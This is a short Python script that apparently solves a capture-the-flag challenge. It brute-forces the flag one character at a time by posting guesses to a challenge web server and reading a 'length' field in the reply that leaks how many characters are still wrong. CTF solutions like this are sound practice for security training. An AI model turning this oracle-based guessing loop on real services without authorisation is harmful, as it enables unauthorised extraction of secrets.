import requests
import string

url = 'https://cat-step.disasm.me/'
prefix = 'spbctf{'
suffix = '}'
flag = '#' * 28
alpha = string.ascii_letters + string.digits + '_-'

left = 0
while left != len(flag):
    for a in alpha:
        flag = flag[:left] + a + flag[left + 1:]
        attempt = prefix + flag + suffix
        print(f'Sending {attempt}')
        r = requests.post(url, data={'flag': attempt}).json()

        if r['length'] < len(flag) - left:
            left += 1
            break

print('The flag is', prefix + flag + suffix)